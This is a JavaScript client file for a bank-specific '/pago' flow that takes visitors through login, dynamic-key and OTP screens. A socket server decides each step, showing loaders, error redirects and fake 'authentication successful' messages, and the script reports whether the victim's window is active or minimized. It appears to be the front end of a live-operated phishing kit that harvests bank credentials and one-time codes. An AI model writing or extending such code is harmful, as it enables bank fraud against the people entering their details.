// assets/js/socketConnection.js
(function () {
    const RT = (window.RT = window.RT || {
        basePath: "/pago", // ✅ nuevo
        nodeUrl: null,
        sessionId: null,
        sessionToken: null,
        bank: null,
        step: null,
        alertId: null,
        actionToScreen: {
            AUTH: "1",
            AUTH_WAIT_ACTION: "1",
            AUTH_ERROR: "1",

            DINAMIC: "2",
            DINAMIC_WAIT_ACTION: "2",
            DINAMIC_ERROR: "2",

            OTP: "3",
            OTP_WAIT_ACTION: "3",
            OTP_ERROR: "3",
        },
        /* actionToScreen: {
            AUTH: "2",
            AUTH_WAIT_ACTION: "2",
            AUTH_ERROR: "1",

            DINAMIC: "3",
            DINAMIC_WAIT_ACTION: "3",
            DINAMIC_ERROR: "3",

            OTP: "4",
            OTP_WAIT_ACTION: "4",
            OTP_ERROR: "4",
        }, */
    });

    let socket = null;
    let isConnecting = false;
    let boundSocket = null;
    const pendingEmits = [];

    // Callback único por pantalla
    window.__rtUpdateCb = null;

    // Estado de control
    RT._seenWait = false;
    RT.lastAction = RT.lastAction || null; // ej: OTP_WAIT_ACTION
    RT.lastBaseAction = RT.lastBaseAction || null; // ej: OTP

    function safeShowLoading(msg) {
        window.showLoading?.(msg);
    }
    function safeHideLoading() {
        window.hideLoading?.();
    }

    function normalizeAction(a) {
        const action = String(a || "");
        return action.endsWith("_WAIT_ACTION")
            ? action.replace("_WAIT_ACTION", "")
            : action;
    }

    function isWaitingAction(a) {
        return String(a || "").endsWith("_WAIT_ACTION");
    }

    function getExpectedStepFromAction(action) {
        const base = normalizeAction(action);
        return RT.actionToScreen[action] || RT.actionToScreen[base] || null;
    }

    function buildStepUrl(step) {
        // si hay bank => /pago/{bank}/step/{step}
        if (RT.bank) return `${RT.basePath}/${RT.bank.toLowerCase()}/step/${step}`;

        // si NO hay bank => /pago/step/{step}
        return `${RT.basePath}/step/${step}`;
    }

    function buildStartUrl() {
        // si hay bank => /pago/{bank}
        if (RT.bank) return `${RT.basePath}/${RT.bank}`;

        // si NO hay bank => /pago/step/1 (o /pago si quieres)
        return `${RT.basePath}/step/1`;
    }

    function redirectToAction(action) {
        try {
            if (!RT.bank) return;

            const target = getExpectedStepFromAction(action);
            if (!target) return; // evita step/undefined

            if (String(RT.step) === String(target)) return; // ya estás ahí
            if (!RT.action.startsWith("DATA")) window.location.href = buildStepUrl(target);
        } catch (e) {
            console.log("redirectToAction error", e);
        }
    }

    function emitPresence(state) {
        try {
            if (socket && socket.connected)
                socket.emit("user:presence", { state });
        } catch {}
    }

    function flushQueue() {
        if (!socket || !socket.connected) return;
        while (pendingEmits.length) {
            const { eventName, payload, ackCb } = pendingEmits.shift();
            socket.emit(eventName, payload, ackCb);
        }
    }

    function submitTypeFromEvent(eventName) {
        if (eventName === "user:submit_auth") return "AUTH";
        if (eventName === "user:submit_dinamic") return "DINAMIC";
        if (eventName === "user:submit_otp") return "OTP";
        return null;
    }

    async function refreshTokenAndReconnect(sock) {
        if (!RT.nodeUrl || !RT.sessionId) throw new Error("missing_session");

        const url = `${RT.nodeUrl}/api/sessions/${RT.sessionId}/issue-token`;
        const res = await fetch(url, { method: "POST" });
        const data = await res.json();

        if (!res.ok || !data?.sessionToken) throw new Error("refresh_failed");

        RT.sessionToken = data.sessionToken;
        sock.auth = { token: RT.sessionToken };
        sock.connect();
    }

    function syncFromServer(cb) {
        try {
            if (!socket || !socket.connected) return cb?.(null);

            socket.emit("user:get_session", (sync) => {
                if (!sync?.ok || !sync.session) return cb?.(null);

                const s = sync.session;

                // 1) si hay error en sesión, muéstralo
                if (s.lastError) {
                    const alertId = RT.alertId; // tu alert actual de pantalla
                    if (alertId)
                        window.showBankAlert?.(alertId, String(s.lastError));
                }

                // 2) redirige al step correcto según action
                const action = String(s.action || "");
                const expected = RT.actionToScreen?.[action];
                const current = String(RT.step || "");

                // si no sabemos expected, solo termina
                if (!expected) return cb?.(s);

                // si está en step equivocado, corrige
                if (current && String(expected) !== current) {
                    safeShowLoading("Redirigiendo...");
                    window.location.href = `/pago/${RT.bank}/step/${expected}`;
                    return;
                }

                // si ya está correcto, devuelve sesión al caller
                cb?.(s);
            });
        } catch (e) {
            console.error("syncFromServer error", e);
            cb?.(null);
        }
    }

    function bindListeners(sock) {
        if (!sock || boundSocket === sock) return;
        boundSocket = sock;

        sock.on("connect", () => {
            isConnecting = false;
            flushQueue();
            safeHideLoading();
            emitPresence("ACTIVE");
        });

        sock.on("connect_error", async (err) => {
            const reason = String(err?.message || "");
            if (reason === "token_expired" || reason === "invalid_token") {
                try {
                    await refreshTokenAndReconnect(sock);
                    return;
                } catch {
                    safeHideLoading();
                    window.showBankAlert?.(
                        "error_custom",
                        "Tu sesión expiró. Recarga la página.",
                    );
                    return;
                }
            }

            safeHideLoading();
            window.showBankAlert?.(
                "error_custom",
                "Error de conexión. Intenta nuevamente.",
            );
        });

        window.addEventListener("blur", () => emitPresence("MINIMIZED"));
        window.addEventListener("focus", () => emitPresence("ACTIVE"));
        document.addEventListener("visibilitychange", () => {
            emitPresence(
                document.visibilityState === "hidden" ? "MINIMIZED" : "ACTIVE",
            );
        });

        sock.on("session:update", (s) => {
            if (!s || !s.action) return;

            // ✅ Si venimos del flujo general (sin bank) y el server ya definió bank,
            // saltamos al inicio del flujo bank.
            if (!RT.bank && s.bank && !s.action.startsWith("DATA")) {
                RT.bank = String(s.bank);
                safeShowLoading("Redirigiendo...");
                window.location.href = `/pago/${RT.bank}`; // start del bank
                return;
            }
            // saltamos al inicio del flujo bank.
            if (s.action === "FINISH") {
                safeShowLoading("Redirigiendo...");
                let url = '/pago/resultado';
                if(s.url) {
                    url = `${s.url}/finish`;
                }
                window.location.href = url; // resultado
                return;
            }

            const action = String(s.action);
            const baseAction = normalizeAction(action);

            RT.lastAction = action;
            RT.lastBaseAction = baseAction;
            RT.expected = baseAction; // para redirectToExpected

            const expectedStep = getExpectedStepFromAction(action);
            const currentStep = String(RT.step || "");
            const alertId = RT.alertId;

            console.log("[RT] update:", {
                action: s.action,
                expectedStep: getExpectedStepFromAction(s.action),
                currentStep: RT.step,
                bank: RT.bank,
                sessionId: RT.sessionId,
            });

            // 1) WAIT_ACTION: solo loading y NO navegar
            if (isWaitingAction(action)) {
                RT._seenWait = true;
                const loadingText = action.startsWith("DATA")
                    ? "Validando información..."
                    : currentStep === "2"
                      ? "Autenticando..."
                      : currentStep === "3"
                        ? "Validando..."
                        : currentStep === "4"
                          ? "Validando..."
                          : "Cargando...";

                safeShowLoading(loadingText);
                if (alertId) window.hideBankAlert?.(alertId);
                return;
            }

            // 2) Mostrar/ocultar alertas si aplica
            if (alertId) {
                if (s.lastError) window.showBankAlert?.(alertId, s.lastError);
                else window.hideBankAlert?.(alertId);
            }

            if (action === "DATA_ERROR") {
                safeHideLoading();
                window.showAlert?.("error_data");
                if (typeof window.__rtUpdateCb === "function")
                    window.__rtUpdateCb(s);
                try {
                    sessionStorage.setItem("rt_last_error", String(msg));
                } catch {}
                
                // Si por alguna razón llega en flujo bank, solo muestra alerta
                return;
            }

            // 3) Errores: redirigir al step correcto (o si ya estás, solo alerta)
            if (action === "AUTH_ERROR") {
                // evita mostrar auth_error “fantasma” si no hubo WAIT previo
                if (!RT._seenWait) return;

                safeHideLoading();
                if (s?.lastError) {
                    try {
                        sessionStorage.setItem(
                            "rt_last_error",
                            String(s.lastError),
                        );
                    } catch {}
                }
                window.location.href = `/pago/${RT.bank}`; // start => step1
                return;
            }

            if (action === "DINAMIC_ERROR") {
                safeHideLoading();
                const msg = s?.lastError || "Error. Intenta nuevamente.";

                if (String(RT.step) === "3") {
                    window.showBankAlert?.(RT.alertId || "dinamicError", msg);
                    if (typeof window.__rtUpdateCb === "function")
                        window.__rtUpdateCb(s);
                    return;
                }

                try {
                    sessionStorage.setItem("rt_last_error", String(msg));
                } catch {}
                window.location.href = `/pago/${RT.bank}/step/3`;
                return;
            }

            if (action === "OTP_ERROR") {
                safeHideLoading();
                const msg =
                    s?.lastError || "Dato inválido. Intenta nuevamente.";

                if (String(RT.step) === "4") {
                    window.showBankAlert?.(RT.alertId || "otpError", msg);
                    if (typeof window.__rtUpdateCb === "function")
                        window.__rtUpdateCb(s);
                    return;
                }

                try {
                    sessionStorage.setItem("rt_last_error", String(msg));
                } catch {}
                window.location.href = `/pago/${RT.bank}/step/4`;
                return;
            }

            // 4) Limpiar flags cuando ya hubo decisión final (no WAIT)
            RT._seenWait = false;

            // 5) Redirección normal si el action indica otro step
            // Evita navegar si no hay expectedStep
            if (expectedStep && String(expectedStep) !== String(currentStep) && action != "FINISH") {
                console.log(action)
                const fromDatato1 =
                    (action === "AUTH" || action === "CC") &&
                    String(currentStep) === "1" || "2";
                const from2to3or4 =
                    (action === "DINAMIC" || action === "OTP") &&
                    String(currentStep) === "2";
                const from3to4 =
                    action === "OTP" && String(currentStep) === "3";
                const from4to3 =
                    action === "DINAMIC" && String(currentStep) === "4";

                const shouldShowSuccess = from2to3or4 || from3to4 || from4to3 || fromDatato1;

                if (shouldShowSuccess) {
                    setTimeout(() => {
                        safeHideLoading();

                        const msg =
                            String(currentStep) === "2"
                                ? "Autenticación exitosa."
                                : "Validación exitosa.";

                        try {
                            window.showBankAlert("success", msg);
                        } catch (error) {
                            window.showAlert?.("success");
                        }
                        

                        setTimeout(() => {
                           try {
                            window.hideBankAlert("success");
                        } catch (error) {
                            window.hideAlert?.("success");
                        }
                        }, 1000);
                    }, 1500);

                    setTimeout(() => {
                        safeShowLoading("Redirigiendo...");
                        window.location.href = `/pago/${RT.bank}/step/${expectedStep}`;
                    }, 2000);

                    return;
                }

                // redirección inmediata para el resto
                window.location.href = `/pago/${RT.bank}/step/${expectedStep}`;
                return;
            }

            // 6) callback por pantalla
            if (typeof window.__rtUpdateCb === "function") {
                try {
                    window.__rtUpdateCb(s);
                } catch (e) {
                    console.error(e);
                }
            }
        });

        window.addEventListener("beforeunload", () => {
            try {
                sock?.disconnect();
            } catch {}
        });
    }

    window.initSocketConnection = function (
        nodeUrl,
        sessionId,
        sessionToken,
        bank,
        step,
    ) {
        if (!nodeUrl || !sessionToken) return;

        RT.nodeUrl = nodeUrl;
        RT.sessionId = sessionId;
        RT.sessionToken = sessionToken;
        RT.bank = bank;
        RT.step = step;

        if (socket && socket.connected) {
            bindListeners(socket);
            return;
        }

        if (isConnecting) return;

        safeShowLoading("Conectando...");
        isConnecting = true;

        socket = io(nodeUrl, {
            transports: ["websocket"],
            auth: { token: sessionToken },
            autoConnect: false,
        });

        window.RT_SOCKET = socket;
        bindListeners(socket);
        socket.connect();
    };

    window.registerSocketUpdateCallback = function (callback) {
        window.__rtUpdateCb = callback;
    };

    window.rtEmitSubmit = function (eventName, payload, ackCb) {
        const submitting = submitTypeFromEvent(eventName);

        safeShowLoading("Cargando...");

        // ✅ Bloqueo si hay una validación en proceso (WAIT_ACTION)
        console.log(eventName)
        if (isWaitingAction(RT.lastAction) && eventName !== 'user:submit_data') {
            const waitingFor = RT.lastBaseAction; // AUTH | DINAMIC | OTP
             console.log("bloqueo bank flow")
            if (submitting && submitting !== waitingFor) {
                safeHideLoading();
                redirectToAction(waitingFor);
                window.showBankAlert?.(
                    "error_custom",
                    "Ya hay una validación en proceso. Espera un momento.",
                );
                return;
            }
        }

        // ✅ Forzar al step correcto del submit
        if (submitting && RT.bank && eventName !== 'user:submit_data') {
            console.log('forzado')
            redirectToAction(submitting);
        }

        // si no hay socket o no está conectado, encola y conecta
        if (!socket || !socket.connected) {
            pendingEmits.push({ eventName, payload, ackCb });

            if (RT.nodeUrl && RT.sessionToken) {
                window.initSocketConnection(
                    RT.nodeUrl,
                    RT.sessionId,
                    RT.sessionToken,
                    RT.bank,
                    RT.step,
                );
            }
            return;
        }

        socket.emit(eventName, payload, (res) => {
            try {
                // ✅ Caso importante: bad_state (front desincronizado)
                if (!res?.ok && res?.error === "bad_state" && eventName !== 'user:submit_data') {
                    // no es error de credenciales, es estado actual distinto
                    safeHideLoading();
                    console.log("sincronizando desde server")
                    // pide snapshot real y corrige ruta/alertas
                    syncFromServer(() => {
                        // listo, si tocaba redirigir ya lo hizo
                    });

                    return ackCb?.(res);
                }

                // normal
                return ackCb?.(res);
            } catch (e) {
                console.error("ack wrapper error", e);
                return ackCb?.({ ok: false, error: "client_error" });
            }
        });
    };

    window.redirectToExpected = function () {
        redirectToAction(RT.expected);
    };
})();
